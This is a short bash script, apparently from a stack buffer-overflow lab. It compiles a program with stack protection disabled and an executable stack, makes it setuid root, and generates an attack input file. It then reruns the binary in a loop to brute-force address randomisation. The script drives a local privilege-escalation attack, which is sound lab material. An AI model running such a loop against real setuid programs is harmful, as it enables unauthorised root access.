#!/bin/bash

    SECONDS=0
    value=0
    sudo /sbin/sysctl -w kernel.randomize_va_space=2
    gcc -m32 -fno-stack-protector -z execstack -o stack3 stack3.c
    #gcc  -std=c99 -o stack3 -z execstack -fno-stack-protector stack3.c
    sudo chown root stack3
    sudo chmod 4755 stack3
    gcc -std=c99 -o call_shell3 call_shell3.c

    ./call_shell3 "badfile_3"

    while [ 1 ]
        do
        value=$(( $value + 1 ))
        duration=$SECONDS
        min=$(($duration / 60))
        sec=$(($duration % 60))
        echo "$min minutes and $sec seconds elapsed."
        echo "The program has run $value times so far."
        ./stack3 "badfile_3"
    done
